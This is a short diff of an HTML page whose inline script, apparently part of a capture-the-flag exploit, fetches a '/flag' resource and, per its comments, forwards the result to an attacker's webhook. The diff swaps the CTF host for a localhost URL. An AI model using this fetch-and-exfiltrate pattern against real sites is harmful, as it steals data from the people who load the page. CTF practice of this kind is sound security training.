@@ -3,7 +3,7 @@
 <head>
     <script>
         // Automatically fetch `/flag` and send the result to your webhook
-        fetch("https://bop-d3eb6e8c-nissekjeks.julew.tf/flag")
+        fetch("127.0.0.1/flag?action=flag_v2()")
             .then(response => response.text()) // Extract flag content as text
             .then(flag => {
                 // Forward the flag content to your webhook
